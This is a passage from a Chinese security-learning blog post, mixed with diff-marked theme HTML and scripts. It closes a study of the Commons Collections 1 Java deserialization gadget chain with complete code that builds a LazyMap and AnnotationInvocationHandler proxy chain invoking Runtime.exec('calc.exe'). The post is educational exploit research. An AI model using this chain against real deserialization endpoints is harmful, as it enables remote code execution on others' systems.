+<p>接下来因为我们还需要走到readObject中，所以我们再次使用上一个的最后一部分，记得这里的transformedMap要改成mapProxy了<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205163621.png" alt="image.png"><br>于是我们尝试运行<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205163709.png" alt="image.png"><br>嗯，宣<br>最后代码如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)  <br>&#125;;  <br>ChainedTransformer chainedTransformer=(ChainedTransformer) <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>HashMap&lt;Object,Object&gt; map =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>  <br>Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);  <br>  <br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br><span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationHandlerConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);  <br>annotationInvocationHandlerConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">lazymapInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);  <br>  <br><span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,lazymapInvocationHandler);  <br>  <br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span>  annotationInvocationHandlerConstructor.newInstance(Override.class,mapProxy);  <br>serialize(o);  <br>unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure>
 <p>结束力！！今天好快，今天估计能把CC2搞完喵</p>
+</article><div class="post-copyright"><div class="post-copyright__author_group"><a class="post-copyright__author_img" href="/about/"><img class="post-copyright__author_img_front" src= "/img/loading.avif" data-lazy-src="/img/bitbug_favicon.ico"></a><div class="post-copyright__author_name">fault`s blog</div><div class="post-copyright__author_desc"></div></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div id="quit-box" onclick="RemoveRewardMask()"></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本文是原创文章，采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>协议，完整转载请注明来自<a href="/">fault`s blog</a></span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/"><span class="tags-punctuation"><i class="solitude fa-solid fa-hashtag"></i>Java<span class="tagsPageCount">8</span></span></a></div></div></div><nav class="needEndHide pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/03/21/NSSCTF%20IOT%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">NSSCTF IOT题目复现</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/21/commons-collections%206/"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">commons-collections 6</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="solitude fa-solid fa-star"></i><span>喜欢这篇的人也看了</span><div class="relatedPosts-link"><a onclick="event.preventDefault(); toRandomPost();" href="javascript:void(0);" rel="external nofollow" data-pjax-state="">随便逛逛</a></div></div><div class="relatedPosts-list"><div><a href="/2024/03/21/commons-collections%206/" title="commons-collections 6"><img class="cover" src= "/img/loading.avif" data-lazy-src="/var(--default-bg-color)" alt="cover"><div class="content is-center"><div class="title">commons-collections 6</div></div></a></div><div><a href="/2024/03/21/commons-collections%204/" title="commons-collections 4"><img class="cover" src= "/img/loading.avif" data-lazy-src="/var(--default-bg-color)" alt="cover"><div class="content is-center"><div class="title">commons-collections 4</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><div class="author-info__top-group"><div class="author-info__sayhi" id="author-info__sayhi" onclick="sco.changeSayHelloText()">sayhello.morning</div></div></div><div class="avatar-img-group"><img class="avatar-img" alt="头像" src= "/img/loading.avif" data-lazy-src="/img/douni.jpg"><div class="avatar-sticker"><img class="avatar-sticker-img" src= "/img/loading.avif" data-lazy-src="/img/douni.jpg" alt="心情贴纸"></div></div><div class="author-info__description_group"><div class="author-info__description">fault的小天地喵</div><div class="author-info__description2">I believe you can find knowledge and tutorials here that will be useful to you.</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about/"><div class="author-info__name">fault_li</div><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon" target="_blank" rel="noopener" href="https://github.com/fault123" title="Github"><i class="solitude  fab fa-github"></i></a><a class="social-icon" target="_blank" rel="noopener" href="https://space.bilibili.com/1329819902" title="Bilibili"><i class="solitude  fab fa-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="solitude fa-solid fa-map"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/07/28/%E5%B7%A5%E5%9D%8Awp-RSA2/" title="工坊wp-RSA2"><img alt="工坊wp-RSA2" src= "/img/loading.avif" data-lazy-src="/"></a><div class="content"><span class="title" href="/2024/07/28/%E5%B7%A5%E5%9D%8Awp-RSA2/" title="工坊wp-RSA2">工坊wp-RSA2</span></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/26/%E5%B7%A5%E5%9D%8Awp-RSA1/" title="nss-工坊wp"><img alt="nss-工坊wp" src= "/img/loading.avif" data-lazy-src="/"></a><div class="content"><span class="title" href="/2024/07/26/%E5%B7%A5%E5%9D%8Awp-RSA1/" title="nss-工坊wp">nss-工坊wp</span></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/23/DASCTF%202024%20%E4%B8%83%E6%9C%88%E8%B5%9B%20web%20Sanic's%20revenge&amp;&amp;ciscn%202024%20sanic%E7%9A%84%E5%A4%8D%E7%9B%98/" title="DASCTF 2024 七月赛 web Sanic's revenge&amp;&amp;ciscn 2024 sanic的复盘"><img alt="DASCTF 2024 七月赛 web Sanic's revenge&amp;&amp;ciscn 2024 sanic的复盘" src= "/img/loading.avif" data-lazy-src="/"></a><div class="content"><span class="title" href="/2024/07/23/DASCTF%202024%20%E4%B8%83%E6%9C%88%E8%B5%9B%20web%20Sanic's%20revenge&amp;&amp;ciscn%202024%20sanic%E7%9A%84%E5%A4%8D%E7%9B%98/" title="DASCTF 2024 七月赛 web Sanic's revenge&amp;&amp;ciscn 2024 sanic的复盘">DASCTF 2024 七月赛 web Sanic's revenge&amp;&amp;ciscn 2024 sanic的复盘</span></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/21/NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/" title="NTLM认证学习"><img alt="NTLM认证学习" src= "/img/loading.avif" data-lazy-src="/"></a><div class="content"><span class="title" href="/2024/03/21/NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/" title="NTLM认证学习">NTLM认证学习</span></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/21/kerberos%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/" title="kerberos协议学习"><img alt="kerberos协议学习" src= "/img/loading.avif" data-lazy-src="/"></a><div class="content"><span class="title" href="/2024/03/21/kerberos%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/" title="kerberos协议学习">kerberos协议学习</span></div></div></div></div></div></div></main><footer id="footer"><div id="st-footer-bar"><div class="footer-logo"><span>fault# Solitude / fas fa-ghost / /img/pwa/favicon.ico</span></div><div class="footer-bar-description">Articles from Ever Fu.</div><a class="footer-bar-link" href="/about/">Learn more</a></div><div id="footer_deal"></div><div id="st-footer"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div class="copyright">© 2023 - 2024 By&nbsp;<a class="footer-bar-link" href="/">fault_li</a></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/everfu/hexo-theme-solitude" alt="Theme">Theme</a></div></div></div></footer></div><!-- right_menu--><!-- inject body--><div><script src="/js/utils.js?v=2.0.4"></script><script src="/js/main.js?v=2.0.4"></script><script src="/js/third_party/waterfall.min.js?v=2.0.4"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/pjax/0.2.8/pjax.min.js"></script><script src="/js/third_party/universe.min.js?v=2.0.4"></script><script>dark()
+</script><script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-lazyload/19.1.3/lazyload.iife.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/node-snackbar/0.1.16/snackbar.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/11.0.5/swiper-bundle.min.js"></script><script>var meting_api = 'https://meting.qjqq.cn/?server=:server&type=:type&id=:id&auth=:auth&r=:r';</script><script src="https://cdnjs.cloudflare.com/ajax/libs/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/meting/2.0.1/Meting.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js"></script><div class="js-pjax"></div></div><!-- pjax--><script>const pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: ['title','#body-wrap','#site-config','meta[name="description"]','.js-pjax','meta[property^="og:"]','#config-diff'],
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+})
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/Java/" class="print-no-link">#Java</a>
-      
-    </div>
-  
-</div>
+document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+})
 
+document.addEventListener('pjax:complete', () => {
+    window.refreshFn()
 
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>commonscollections-1</div>
-      <div>http://example.com/2024/03/21/commonscollections-1/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>fault_li</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2024年3月21日</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>许可协议</div>
-          <div>
-            
-              
-              
-                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                    <i class="iconfont icon-by"></i>
-                  </span>
-                </a>
-              
-            
-          </div>
-        </div>
-      
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
-
-
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2024/03/21/NSSCTF%20IOT%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" title="NSSCTF IOT题目复现">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">NSSCTF IOT题目复现</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2024/03/21/commons-collections%206/" title="commons-collections 6">
-                        <span class="hidden-mobile">commons-collections 6</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-          </article>
-        </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header">
-    <i class="iconfont icon-list"></i>
-    <span>目录</span>
-  </p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://github.com/fault123" target="_blank" rel="nofollow noopener"><span>fault</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-    </div>
-  
-  
-  
-  
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+        const newScript = document.createElement('script')
+        const content = item.text || item.textContent || item.innerHTML || ""
+        Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+        newScript.appendChild(document.createTextNode(content))
+        item.parentNode.replaceChild(newScript, item)
     })
-  </script>
 
+    GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
 
-<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+})
 
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
+document.addEventListener('pjax:error', (e) => {
+    if (e.request.status === 404) {
+        pjax.loadUrl('/404.html')
     }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
+})</script><!-- theme--><script>initTheme = () => {
+    let isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const cachedMode = utils.saveToLocal.get('theme');
+    if (cachedMode === undefined) {
+        const nowMode =
+            isDarkMode ? 'dark' : 'light'
+        document.documentElement.setAttribute('data-theme', nowMode);
+    } else {
+        document.documentElement.setAttribute('data-theme', cachedMode);
     }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-
-  
-<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/runtime.min.js"></script>
-<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/Cherry.min.js"></script>
-<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/star.min.js"></script>
-<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/love.min.js"></script>
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":300,"height":600},"mobile":{"show":true},"react":{"opacity":1},"log":false});</script></body>
-</html>
+    typeof rm === 'object' && rm.mode(cachedMode === 'dark' && isDarkMode)
+}
+initTheme()</script><!-- google adsense--><!-- search--><!-- Tianli-Talk--><!-- music--><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":300,"height":600},"mobile":{"show":true},"react":{"opacity":1},"log":false});</script></body></html><script>const posts=["2024/07/28/工坊wp-RSA2/","2024/07/26/工坊wp-RSA1/","2024/07/23/DASCTF 2024 七月赛 web Sanic's revenge&&ciscn 2024 sanic的复盘/","2024/03/21/NTLM认证学习/","2024/03/21/kerberos协议学习/","2024/03/21/2023/","2024/03/21/NSSCTF IOT题目复现/","2024/03/21/commonscollections-1/","2024/03/21/commons-collections 6/","2024/03/21/commons-collections 4/","2024/03/21/commons-collections 2/","2024/03/21/commons-collection 3/","2024/03/21/动态类加载/","2024/03/21/动态代理/","2024/03/21/URLDNS/","2024/03/21/Tomcat源码初识（tomcat流程）/","2024/03/21/hello-world/","2024/02/18/EL表达式注入/"];function toRandomPost(){ pjax.loadUrl(GLOBAL_CONFIG.root+posts[Math.floor(Math.random()*posts.length)]); }</script>
